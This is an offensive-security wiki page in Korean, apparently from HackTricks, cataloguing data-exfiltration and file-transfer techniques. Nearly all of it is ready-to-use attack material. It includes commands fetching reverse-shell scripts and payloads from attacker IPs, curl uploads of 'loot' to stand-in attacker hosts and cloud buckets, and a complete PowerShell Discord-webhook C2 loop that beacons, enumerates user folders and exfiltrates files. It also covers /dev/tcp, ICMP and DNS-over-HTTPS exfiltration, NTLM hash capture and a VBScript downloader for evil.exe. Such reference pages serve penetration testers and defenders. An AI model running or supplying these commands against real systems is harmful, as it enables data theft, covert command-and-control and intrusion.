# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public`에서 loot을 staging하고 Rclone으로 legitimate backup을 모방하여 exfiltrate하는 end-to-end 예시는 아래 workflow를 참고하세요.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## 정보를 exfiltrate할 때 자주 whitelist되는 domain

자주 whitelist되어 악용될 수 있는 domain을 확인하려면 [https://lots-project.com/](https://lots-project.com/)을 참고하세요.

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 파일 업로드

- [**파일 업로드를 지원하는 SimpleHttpServer**](https://gist.github.com/UniIsland/3346170)
- [**GET 및 POST 요청(헤더 포함)을 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS 서버**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

이그레스 controls가 classic **TCP/443** inspection에 맞춰져 있지만 **UDP/443**에는 permissive하다면, **HTTP/3**를 강제하여 transfer를 TLS-over-TCP 대신 **QUIC**으로 전환할 수 있습니다. 공격자 endpoint는 native HTTP/3 support가 필요합니다(예: 이미 `Alt-Svc: h3`를 advertising하는 reverse proxy 또는 upload endpoint).
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
2025년 연구 논문(QUIC-Exfil)에 따르면, encrypted headers 및 connection migration과 같은 QUIC 기능은 classic TLS 또는 DNS-based channels보다 exfiltration의 방화벽 수준 탐지를 더 어렵게 만들 수 있으므로, HTTP/3 지원이 확산됨에 따라 이 영역의 중요성이 더욱 커질 것으로 예상됩니다.

### Pre-signed / delegated object-storage uploads

단기 만료 **signed URL**을 생성하거나 획득할 수 있다면, victim에게는 일반적인 HTTPS client만 필요합니다. 이를 통해 호스트에 cloud SDK 또는 장기 credentials를 설치할 필요가 없으며, 일반적인 object-storage 트래픽에 자연스럽게 섞일 수 있습니다.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
참고:
- Pre-signed URLs / SAS tokens는 일반적으로 **path**, **HTTP method**, **expiration** 범위를 지정합니다.
- Azure Blob `Put Blob`에서는 `x-ms-blob-type: BlockBlob`이 필수입니다.
- 이 패턴은 `curl`, `Invoke-WebRequest` 또는 raw HTTPS `PUT`을 실행할 수 있는 모든 custom implant에서 효과적으로 사용할 수 있습니다.

### goshs

[goshs](https://github.com/patrickhener/goshs)는 `python3 -m http.server`를 대체하는 single-binary 도구로,
upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
그리고 OOB collaboration 기능(DNS, SMTP, NTLM hash capture)을 제공합니다.
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## C2 및 Data Exfiltration을 위한 Webhooks (Discord/Slack/Teams)

Webhooks는 JSON과 선택적 파일 파트를 허용하는 write-only HTTPS endpoints입니다. 일반적으로 신뢰된 SaaS 도메인에 허용되며 OAuth/API keys가 필요하지 않으므로, 낮은 마찰의 beaconing 및 exfiltration에 유용합니다.

주요 아이디어:
- Endpoint: Discord는 https://discord.com/api/webhooks/<id>/<token>을 사용합니다.
- `payload_json`이라는 이름의 파트에 `{"content":"..."}`를 포함하고, 선택적으로 `file`이라는 이름의 파일 파트를 포함하는 `POST multipart/form-data`.
- Operator loop pattern: 주기적 beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK는 delivery를 확인합니다.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
참고:
- incoming webhook을 사용하는 다른 collaboration platform(Slack/Teams)에도 유사한 패턴이 적용됩니다. 그에 맞게 URL과 JSON schema를 조정하세요.
- Discord Desktop cache artifacts와 webhook/API recovery에 대한 DFIR은 다음을 참조하세요.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage exfiltration)

Modern operators는 loot를 로컬에 **staging**한 후 [Rclone](https://rclone.org/)을 사용해 transfer를 일반적인 backup 또는 sync job처럼 보이게 하는 경우가 많습니다. 실용적인 패턴은 다음과 같습니다.

1. 일반적인 remote(`s3`, `webdav`, `drive`, `mega`, ...)
2. **contents와 filenames를 client-side에서 암호화**하기 위한 `crypt` wrapper
3. provider가 object-size limit을 적용하거나 더 작은 upload unit을 원하는 경우 선택적으로 사용하는 `chunker` wrapper
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
참고:
- `crypt`는 파일 내용과 이름을 모두 암호화할 수 있습니다.
- `chunker`는 대용량 파일을 투명하게 분할하고, download 시 다시 조합합니다.
- `rclone.conf`는 `crypt` secrets를 **obscured** 형식으로 저장하며, at-rest protection이 강력한 것은 아닙니다. 단기간 작업에는 전용 temporary config를 사용한 후 삭제하는 것을 권장합니다. 더 오래 보관해야 한다면, 디스크에 일반 `rclone.conf`를 남겨 두는 대신 encrypted config 처리(`RCLONE_CONFIG_PASS` / `--password-command`)를 사용하는 것이 좋습니다.
- 대상이 이미 **OneDrive**, **Google Drive** 또는 **Dropbox**를 sync하는 경우, loot를 synchronized directory에 복사하면 새로운 transfer binary를 설치하는 대신 이미 승인된 client를 활용할 수 있습니다.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP 서버 (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP 서버 (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP 서버 (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 클라이언트
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

서버로서의 Kali
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
또는 **samba를 사용하여** SMB 공유를 생성합니다:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs)는 파일을 SMB를 통해 제공하고 연결하는 클라이언트로부터 NetNTLMv2 해시를 수집하는 단일 바이너리 대안입니다:
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

공격자는 SSHd가 실행 중이어야 합니다.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

피해자에게 SSH가 있으면 공격자는 피해자의 디렉터리를 공격자 측에 mount할 수 있습니다.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### victim에서 파일 다운로드
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 피해자에게 파일 업로드
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
**@BinaryShadow\_** 님께 감사드립니다

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

기존 UDP/53 DNS가 noisy하거나 차단되어 있지만 outbound HTTPS가 광범위하게 허용되는 경우, 일반적인 DNS-label exfiltration 패턴을 public resolver에 대한 **DoH** requests 내부에 래핑할 수 있습니다. 각 label은 63-byte DNS limit보다 충분히 짧게 유지하고, Base32와 같은 DNS-safe alphabet을 사용하세요.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
`exf.attacker.tld`의 authoritative DNS server에서 numeric prefix를 기준으로 쿼리를 정렬하고 Base32 stream을 재구성합니다. 이렇게 하면 전송이 classic UDP/53 DNS 대신 resolver로 향하는 HTTPS 내부에서 이루어집니다.

양방향 DNS tunnel tooling(`iodine`, `dnscat2` 등)에 대한 자세한 내용은 [tunneling 페이지](tunneling-and-port-forwarding.md)를 확인하세요.

## **SMTP**

SMTP server로 데이터를 보낼 수 있다면, python으로 데이터를 수신하는 SMTP를 생성할 수 있습니다:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs)는 OOB exfiltration 시나리오에서 email callback을 수신하기 위해 빠르게 SMTP server를 실행할 수 있습니다:
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
수신된 emails와 callbacks는 terminal output에 직접 표시됩니다.  
완전한 OOB coverage를 위해 DNS callback server와 결합할 수 있습니다:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

기본적으로 XP 및 2003에서 사용할 수 있습니다(다른 버전에서는 설치 중 명시적으로 추가해야 합니다).

Kali에서 **TFTP server 시작**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python의 TFTP server:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**victim**에서 Kali server에 연결합니다:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHP oneliner로 파일 다운로드:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**피해자**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` 프로그램은 binary를 inspection할 수 있을 뿐만 아니라 **hex로부터 binary를 재구성하는 capability**도 제공합니다. 즉, binary의 hex를 제공하면 `debug.exe`가 binary file을 생성할 수 있습니다. 그러나 debug.exe에는 **최대 64kb 크기의 file만 assemble할 수 있다는 limitation**이 있다는 점에 유의해야 합니다.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
그런 다음 텍스트를 windows-shell에 복사하여 붙여넣으면 nc.exe라는 파일이 생성됩니다.

## References

- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [Rclone `crypt` backend](https://rclone.org/crypt/)
- [goshs](https://github.com/patrickhener/goshs)
- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
- [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
